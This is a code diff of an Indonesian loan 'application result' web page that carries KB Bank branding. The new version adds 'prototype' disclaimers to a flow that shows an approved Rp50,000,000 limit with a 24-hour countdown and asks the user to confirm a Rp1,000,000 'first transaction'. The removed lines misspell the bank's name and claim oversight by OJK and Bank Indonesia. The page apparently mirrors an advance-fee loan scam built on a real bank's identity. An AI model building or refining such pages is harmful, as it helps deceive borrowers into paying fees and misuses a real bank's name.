@@ -1,47 +1,206 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>KB BANK FIANCE — Hasil Pengajuan</title>
-  <link rel="stylesheet" href="style.css">
-  <link rel="stylesheet" href="flow.css">
-  <link rel="stylesheet" href="mobile-polish.css?v=20260807-stage1">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="color-scheme" content="dark" />
+  <meta name="theme-color" content="#16082f" />
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data:; style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self'; form-action 'self'; base-uri 'none';" />
+  <title>Hasil Simulasi Pengajuan</title>
+  <style>
+    :root{
+      --bg1:#200c43;--bg2:#14072d;--bg3:#090417;
+      --gold:#f6cd54;--gold2:#fff19a;--text:#fff;--muted:#cfc6d9;--muted2:#a99fb5;
+      --ok:#caffc8;--line:rgba(247,205,84,.34);--surface:linear-gradient(180deg,rgba(60,28,101,.70),rgba(17,7,39,.84));
+      --radius:26px;--page:760px;
+    }
+    *{box-sizing:border-box}
+    html,body{max-width:100%;overflow-x:hidden}
+    body{margin:0;min-height:100svh;color:var(--text);font-family:Inter,ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;background:radial-gradient(circle at 50% -10%,rgba(91,42,153,.34),transparent 35%),linear-gradient(180deg,#090310,#120625)}
+    button{font:inherit;color:inherit;cursor:pointer}
+    .badge{position:fixed;z-index:80;top:max(10px,env(safe-area-inset-top));left:50%;transform:translateX(-50%);max-width:calc(100vw - 22px);padding:7px 11px;border-radius:999px;background:#f8db6a;color:#2b1b00;border:1px solid rgba(255,255,255,.35);font-size:10px;font-weight:900;letter-spacing:.055em;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;box-shadow:0 7px 18px rgba(0,0,0,.26)}
+    .app{width:min(100%,var(--page));min-height:100svh;margin:auto;position:relative;overflow:hidden;isolation:isolate;background:radial-gradient(circle at 98% 30%,rgba(255,185,36,.08),transparent 20%),radial-gradient(circle at 3% 2%,rgba(108,55,172,.18),transparent 23%),linear-gradient(180deg,var(--bg1),var(--bg2) 30%,var(--bg3));box-shadow:0 26px 70px rgba(0,0,0,.4)}
+    .app:after{content:"";position:absolute;width:420px;height:420px;right:-315px;bottom:120px;border-radius:50%;border:70px solid rgba(219,157,38,.34);z-index:-2}
+    .top{display:flex;justify-content:space-between;align-items:flex-end;padding:28px 28px 0;gap:18px}
+    .brand{line-height:1}.brand .name{font-size:30px;letter-spacing:-.055em}.brand .kb{background:linear-gradient(#ffc32d,#ee980b);-webkit-background-clip:text;background-clip:text;color:transparent}.brand .star{color:#f0eef5}.brand small{display:block;margin-top:7px;color:#bcb3ca;font-size:11px;letter-spacing:.04em}
+    .page-mark{font-size:11px;color:#fff18d;text-align:right;line-height:1.45}.page-mark strong{display:block;font-size:12px}
+    .content{padding:46px 28px 54px}
+    .eyebrow{margin:0 0 8px;color:#fff18d;font-size:11px;font-weight:800;letter-spacing:.16em;text-transform:uppercase}
+    h1{margin:0;font-family:Georgia,"Times New Roman",serif;font-size:39px;font-weight:400;line-height:1.07;letter-spacing:-.03em}
+    .lead{margin:12px 0 0;color:#bfb6ca;font-size:12px;line-height:1.65;max-width:580px}
+    .stack{display:grid;gap:18px;margin-top:24px}
+    .card{position:relative;padding:22px;border-radius:var(--radius);border:1px solid var(--line);background:var(--surface);box-shadow:inset 0 1px 0 rgba(255,255,255,.05),0 18px 45px rgba(0,0,0,.24);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px)}
+    .status-card{overflow:hidden;background:radial-gradient(circle at 90% 10%,rgba(202,255,200,.09),transparent 27%),linear-gradient(145deg,rgba(73,34,119,.87),rgba(18,7,41,.92))}
+    .status-row{display:flex;justify-content:space-between;align-items:flex-start;gap:14px}
+    .status-row h2,.transaction-card h2{margin:0;font-size:16px}.sub{margin:6px 0 0;color:#b9afc4;font-size:11px;line-height:1.5}
+    .status-pill{display:inline-flex;align-items:center;gap:6px;padding:6px 9px;border-radius:999px;background:rgba(144,255,139,.09);border:1px solid rgba(165,255,161,.20);color:var(--ok);font-size:9px;font-weight:900;white-space:nowrap}.status-pill:before{content:"✓"}
+    .summary-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:12px;margin-top:18px}
+    .summary-box{padding:16px;border-radius:18px;border:1px solid rgba(255,255,255,.09);background:rgba(8,4,20,.32)}
+    .summary-box span{display:block;color:#a99fb5;font-size:10px;text-transform:uppercase;letter-spacing:.065em}.summary-box strong{display:block;margin-top:7px;color:#fff;font-size:16px;line-height:1.35;overflow-wrap:anywhere}
+    .summary-box.limit strong{font-size:30px;letter-spacing:-.035em;color:#fff4b1}
+    .safety-note{margin-top:14px;padding:12px 13px;border-radius:14px;border-left:2px solid var(--gold);background:rgba(246,205,84,.055);color:#cbc2d4;font-size:10.5px;line-height:1.55}
+    .temporary-limit{margin-top:14px;padding:15px;border-radius:17px;border:1px solid rgba(246,205,84,.26);background:linear-gradient(135deg,rgba(246,205,84,.075),rgba(68,31,111,.15));box-shadow:inset 0 1px 0 rgba(255,255,255,.035)}
+    .temporary-limit-head{display:flex;justify-content:space-between;align-items:flex-start;gap:12px}
+    .temporary-limit h3{margin:0;font-size:13px;color:#fff4b1}.temporary-limit p{margin:6px 0 0;color:#cfc6d9;font-size:10.5px;line-height:1.55}
+    .time-badge{display:inline-flex;align-items:center;gap:6px;padding:6px 9px;border-radius:999px;border:1px solid rgba(246,205,84,.32);background:rgba(246,205,84,.07);color:#ffe27d;font-size:8.5px;font-weight:900;white-space:nowrap}
+    .countdown{margin-top:12px;padding:11px 12px;border-radius:13px;background:rgba(8,4,20,.30);border:1px solid rgba(255,255,255,.08);display:flex;justify-content:space-between;align-items:center;gap:12px}
+    .countdown span{color:#a99fb5;font-size:9px;text-transform:uppercase;letter-spacing:.06em}.countdown strong{font-size:15px;color:#fff19a;letter-spacing:.04em;font-variant-numeric:tabular-nums}
+    .prototype-payment-note{display:inline-flex;margin-top:12px;padding:6px 9px;border-radius:999px;border:1px solid rgba(202,255,200,.18);background:rgba(144,255,139,.06);color:#d8ffd5;font-size:8.5px;font-weight:900;letter-spacing:.04em}
+    .transaction-card{background:radial-gradient(circle at 88% 5%,rgba(246,205,84,.10),transparent 28%),var(--surface)}
+    .transaction-head{display:flex;justify-content:space-between;align-items:flex-start;gap:12px}
+    .simulation-badge{display:inline-flex;align-items:center;gap:6px;padding:6px 9px;border-radius:999px;border:1px solid rgba(246,205,84,.35);background:rgba(246,205,84,.07);color:#ffe27d;font-size:8.5px;font-weight:900;letter-spacing:.055em;text-align:center}
+    .simulation-badge:before{content:"●";font-size:8px}
+    .transaction-amount{margin:22px 0 8px;font-size:38px;font-weight:850;letter-spacing:-.045em;color:#fff;text-shadow:0 7px 24px rgba(0,0,0,.22)}
+    .transaction-copy{margin:0;color:#d6cddd;font-size:11.5px;line-height:1.65}
+    .primary{width:100%;min-height:56px;margin-top:18px;border:2px solid #f6d34f;border-radius:17px;background:linear-gradient(180deg,rgba(67,30,111,.78),rgba(25,10,55,.88));color:#ffdf63;font-size:14px;font-weight:800;box-shadow:0 0 0 2px rgba(255,199,38,.10),0 8px 24px rgba(0,0,0,.22)}
+    .primary:disabled{cursor:default;opacity:.72;border-color:rgba(202,255,200,.45);color:#d8ffd5}
+    .primary:focus-visible{outline:2px solid #fff19a;outline-offset:2px}
+    .result-message{min-height:20px;margin:10px 2px 0;color:var(--ok);font-size:10.5px;line-height:1.5}
+    footer{padding:0 28px 34px;color:#8d8299;font-size:9.5px;line-height:1.55;text-align:center}
+    @media(max-width:620px){.top{padding-left:20px;padding-right:20px}.content{padding-left:20px;padding-right:20px;padding-top:42px}.summary-grid{grid-template-columns:1fr}.status-row,.transaction-head{flex-direction:column}.summary-box.limit strong{font-size:27px}h1{font-size:34px}.card{padding:19px}.simulation-badge{white-space:normal}}
+  </style>
+  <script src="/page-transition.js?v=1"></script>
 </head>
-<body class="flow-page">
-  <main class="flow-shell">
-    <section class="flow-hero">
-      <div class="flow-top">
-        <button class="flow-back" id="backButton" type="button">←</button>
-        <button class="flow-lang" type="button">ID 🇮🇩</button>
-      </div>
-      <div class="flow-copy">
-        <div class="flow-step">Tahap 9</div>
-        <h1>Hasil Pengajuan</h1>
-        <p>Proses telah selesai dan hasil kini tersedia.</p>
+<body>
+  <div class="badge">PROTOTYPE UI · BUKAN LAYANAN PERBANKAN RESMI</div>
+  <main class="app">
+    <header class="top">
+      <div class="brand"><div class="name"><span class="kb">KB</span><span class="star">star</span></div><small>by KB Bank</small></div>
+      <div class="page-mark"><strong>Hasil Pengajuan</strong>Simulasi UI</div>
+    </header>
+
+    <section class="content">
+      <p class="eyebrow">HASIL SIMULASI PENGAJUAN</p>
+      <h1>Hasil Simulasi Pengajuan</h1>
+      <p class="lead">Halaman ini hanya menampilkan hasil dan transaksi contoh pada antarmuka. Tidak ada keputusan kredit, transfer, setoran, atau transaksi bank nyata.</p>
+
+      <div class="stack">
+        <section class="card status-card" aria-labelledby="resultStatusTitle">
+          <div class="status-row">
+            <div><h2 id="resultStatusTitle">Status</h2><p class="sub">Status pada halaman ini hanya merupakan state UI.</p></div>
+            <span class="status-pill">Simulasi Pengajuan Disetujui</span>
+          </div>
+          <div class="summary-grid">
+            <div class="summary-box limit"><span>Limit Tersedia</span><strong id="resultLimit">Rp50.000.000</strong></div>
+            <div class="summary-box"><span>Rekening KB Bank Demo</span><strong id="resultName">Pengguna Contoh</strong></div>
+          </div>
+          <div class="temporary-limit" aria-live="polite">
+            <div class="temporary-limit-head">
+              <div><h3>Limit Tersedia Sementara</h3><p>Limit pada tampilan ini tersedia selama <strong>24 jam</strong> untuk melanjutkan alur pengajuan pada prototype.</p></div>
+              <span class="time-badge">24 JAM</span>
+            </div>
+            <div class="countdown"><span>Batas waktu prototype</span><strong id="limitCountdown">24:00:00</strong></div>
+            <p>Selesaikan tahapan yang masih diperlukan sebelum batas waktu berakhir. Status akhir dan pencairan dana nyata, jika ada, tetap mengikuti verifikasi, analisis kelayakan, serta ketentuan resmi bank.</p>
+            <span class="prototype-payment-note">PROTOTYPE UI · TIDAK ADA KEWAJIBAN PEMBAYARAN</span>
+          </div>
+          <p class="safety-note"><strong>Catatan:</strong> “Simulasi Pengajuan Disetujui” bukan persetujuan kredit nyata dan tidak berarti dana tersedia untuk dicairkan.</p>
+        </section>
+
+        <section class="card transaction-card" aria-labelledby="firstTransactionTitle">
+          <div class="transaction-head">
+            <div><h2 id="firstTransactionTitle">Simulasi Transaksi Pertama</h2><p class="sub">Konfirmasi antarmuka untuk melanjutkan demonstrasi alur.</p></div>
+            <span class="simulation-badge">SIMULASI · TIDAK ADA PEMBAYARAN NYATA</span>
+          </div>
+          <div class="transaction-amount">Rp1.000.000</div>
+          <p class="transaction-copy">Untuk melanjutkan demonstrasi alur, lakukan konfirmasi transaksi simulasi sebesar Rp1.000.000. <strong>Tidak ada uang nyata yang harus dikirim atau disetorkan.</strong></p>
+          <button class="primary" id="confirmSimulation" type="button">Lanjutkan Simulasi Rp1.000.000</button>
+          <div class="result-message" id="simulationMessage" role="status" aria-live="polite"></div>
+          <p class="safety-note">Tombol ini tidak meminta transfer, tidak memberikan rekening tujuan, tidak membuat QRIS, tidak meminta bukti transfer, tidak memeriksa saldo, dan tidak terhubung ke API bank.</p>
+        </section>
       </div>
     </section>
-    
-<section class="flow-card">
-  <div class="result-center">
-    <div class="result-icon">✓</div>
-    <h2 id="resultTitle">Pengajuan Berhasil Diproses</h2>
-    <p id="resultMessage">Hasil pengajuan telah tersedia.</p>
-  </div>
-  <div class="summary-list" style="margin-top:22px">
-    <div class="summary-row"><span>Nomor Pengajuan</span><strong id="applicationId">—</strong></div>
-    <div class="summary-row"><span>Status</span><strong id="status">—</strong></div>
-    <div class="summary-row"><span>Nominal Pengajuan</span><strong id="amount">—</strong></div>
-    <div class="summary-row"><span>Tenor</span><strong id="tenor">—</strong></div>
-  </div>
-  <div class="flow-note">Status pengajuan diperbarui sesuai tahapan layanan yang sedang diproses. Silakan pantau perkembangan melalui Dashboard.</div>
-  <button class="flow-button" id="dashboardButton" type="button">BUKA DASHBOARD →</button>
-</section>
+
+    <footer>PROTOTYPE UI · BUKAN LAYANAN PERBANKAN RESMI · Tidak ada pembayaran, transfer, setoran, atau pencairan nyata.</footer>
   </main>
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-<script src="storage.js"></script>
-  <script src="hasil-pengajuan.js"></script>
-<div style="padding:10px 16px;text-align:center;font-size:10px;line-height:1.5;color:#7c6f89;background:#f7f1fd;border-top:1px solid #eadcf8"><strong>UI Prototype</strong> — Diawasi OJK & Bank Indonesia</div>
+
+  <script>
+    (()=>{
+      "use strict";
+      const formatRupiah=value=>new Intl.NumberFormat("id-ID",{style:"currency",currency:"IDR",maximumFractionDigits:0}).format(value).replace(/\s/g,"");
+      const storedName=(sessionStorage.getItem("kbFullName")||"").trim();
+      const storedLimit=Number(sessionStorage.getItem("kbPrototypeLimit"))||50000000;
+      const resultName=document.getElementById("resultName");
+      const resultLimit=document.getElementById("resultLimit");
+      const limitCountdown=document.getElementById("limitCountdown");
+      const button=document.getElementById("confirmSimulation");
+      const message=document.getElementById("simulationMessage");
+
+      resultName.textContent=storedName||"Pengguna Contoh";
+      resultLimit.textContent=formatRupiah(storedLimit);
+
+      const limitExpiryKey="kbPrototypeLimitExpiresAt";
+      let limitExpiresAt=Number(sessionStorage.getItem(limitExpiryKey));
+      if(!Number.isFinite(limitExpiresAt)||limitExpiresAt<=0){
+        limitExpiresAt=Date.now()+(24*60*60*1000);
+        sessionStorage.setItem(limitExpiryKey,String(limitExpiresAt));
+      }
+      const renderLimitCountdown=()=>{
+        const remaining=Math.max(0,limitExpiresAt-Date.now());
+        const totalSeconds=Math.floor(remaining/1000);
+        const hours=String(Math.floor(totalSeconds/3600)).padStart(2,"0");
+        const minutes=String(Math.floor((totalSeconds%3600)/60)).padStart(2,"0");
+        const seconds=String(totalSeconds%60).padStart(2,"0");
+        limitCountdown.textContent=`${hours}:${minutes}:${seconds}`;
+      };
+      let countdownTimer=0;
+      const stopCountdown=()=>{if(countdownTimer){clearInterval(countdownTimer);countdownTimer=0;}};
+      const startCountdown=()=>{
+        stopCountdown();
+        renderLimitCountdown();
+        if(Date.now()<limitExpiresAt) countdownTimer=setInterval(renderLimitCountdown,1000);
+      };
+      startCountdown();
+      document.addEventListener("visibilitychange",()=>{document.hidden?stopCountdown():startCountdown();});
+      window.addEventListener("pagehide",stopCountdown,{once:true});
+
+      const finalLogoutKey="kbFinalLogoutAt";
+      const FINAL_WINDOW_MS=5*60*1000;
+      let finalLogoutTimer=0;
+      const redirectToLogin=()=>{
+        if(finalLogoutTimer){clearTimeout(finalLogoutTimer);finalLogoutTimer=0;}
+        sessionStorage.setItem("kbReauthRequired","1");
+        sessionStorage.removeItem(finalLogoutKey);
+        const target="login.html?reauth=1";
+        window.smoothNavigate ? window.smoothNavigate(target) : (window.location.href=target);
+      };
+      const armFinalLogout=()=>{
+        if(finalLogoutTimer){clearTimeout(finalLogoutTimer);finalLogoutTimer=0;}
+        let logoutAt=Number(sessionStorage.getItem(finalLogoutKey));
+        if(!Number.isFinite(logoutAt)||logoutAt<=0){
+          logoutAt=Date.now()+FINAL_WINDOW_MS;
+          sessionStorage.setItem(finalLogoutKey,String(logoutAt));
+        }
+        const remaining=logoutAt-Date.now();
+        if(remaining<=0){redirectToLogin();return;}
+        finalLogoutTimer=setTimeout(redirectToLogin,remaining);
+      };
+
+      const renderCompleted=()=>{
+        button.disabled=false;
+        button.textContent="Kembali ke Dashboard";
+        message.textContent="Konfirmasi selesai. Halaman hasil ini dapat dibuka kembali dari Dashboard selama 5 menit.";
+        armFinalLogout();
+      };
+
+      if(sessionStorage.getItem("kbFirstSimulationConfirmed")==="1") renderCompleted();
+
+      button.addEventListener("click",()=>{
+        if(sessionStorage.getItem("kbFirstSimulationConfirmed")==="1"){
+          const target="dashboard.html";
+          window.smoothNavigate ? window.smoothNavigate(target) : (window.location.href=target);
+          return;
+        }
+        sessionStorage.setItem("kbFirstSimulationConfirmed","1");
+        sessionStorage.removeItem(finalLogoutKey);
+        renderCompleted();
+      });
+
+      document.addEventListener("visibilitychange",()=>{
+        if(!document.hidden && sessionStorage.getItem("kbFirstSimulationConfirmed")==="1") armFinalLogout();
+      });
+      window.addEventListener("pagehide",()=>{if(finalLogoutTimer)clearTimeout(finalLogoutTimer);},{once:true});
+    })();
+  </script>
+  <script src="/simulation-runtime.js?v=5" defer></script>
 </body>
 </html>
